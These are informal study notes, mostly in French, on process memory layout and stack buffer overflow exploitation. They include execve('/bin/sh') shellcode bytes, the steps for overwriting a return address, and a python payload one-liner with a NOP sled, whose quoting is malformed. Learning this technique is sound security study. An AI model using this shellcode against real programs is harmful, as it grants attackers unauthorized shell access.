
Le computer run les programmes en tant que process le process ne sont pas tous actif en même il switch juste vite de process la mémoire elle est organisé comme ci-dessous :
![[Pasted image 20250309113059.png]]

- User stack contains the information required to run the program. This information would include the current program counter, saved registers and more information(we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows(downwards)
    
- Shared library regions are used to either statically/dynamically link libraries that are used by the program
    
- The heap increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.
    
- The program code and data stores the program executable and initialised variables.

On peut overwright l'adresse le registre qui conteint l'adresse de retour pour pointer vers l'adresse qu'on veut (oui c une dinguerie en vrai)

shell:

\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05

faut input ça dans une variable et faire pointer l'addresse de retour a cette endroit ou on a mis la variable (oui oui)

les étapes 
    Find out the address of the start of the buffer and the start address of the return address

    Calculate the difference between these addresses so you know how much data to enter to overflow

    Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address, and the address of the buffer in the return address
NOP instruction en hexa = \x90

avec python : `python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`

ex
`python -c “print(‘\x90’ * 30 +` `‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x``05’` `+`

`‘\x41’ * 60 +` 

`‘\xef\xbe\xad\xde’) | ./program_name`


`”`

